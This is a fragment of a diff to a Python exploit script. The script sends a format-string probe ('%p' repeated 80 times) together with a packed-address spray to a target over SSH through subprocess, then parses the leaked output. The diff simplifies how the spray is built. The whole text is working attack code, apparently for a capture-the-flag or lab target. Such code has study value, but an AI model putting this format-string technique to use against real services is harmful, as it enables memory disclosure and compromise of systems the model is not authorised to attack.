@@ -11,12 +11,9 @@ SSH = [
 ]
 
 fmt = ("AAA " + "%p " * 80).encode()
-spray = b""
-for shift in range(8):
-    spray += b"\x00" * shift + struct.pack("<Q", ADDR)
+spray = struct.pack("<Q", ADDR) * 32
 
-payload = fmt + b"\x00" + spray
-res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+res = subprocess.run(SSH, input=fmt + b"\x00" + spray, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 out = res.stdout.decode("latin-1", errors="ignore")
 
 for line in out.splitlines():
